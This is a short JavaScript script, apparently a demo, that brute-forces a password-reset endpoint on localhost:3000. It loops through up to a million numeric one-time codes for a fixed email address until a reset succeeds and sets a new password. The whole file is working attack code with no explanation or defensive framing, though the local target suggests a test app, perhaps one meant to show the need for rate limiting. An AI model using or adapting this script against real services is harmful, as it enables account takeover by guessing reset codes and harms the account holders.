async function attack() {
    for (let i = 0; i < 1000000; i++) {
        const response = await fetch("http://localhost:3000/reset-password", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ email: "10@gmail.com", otp: i.toString(), password: "password" }),
        });
        if (response.ok) {
            console.log("Password reset successfully");
            break;
        } else {
            console.log("Failed to reset password", i);
        }
    }
}

attack();

    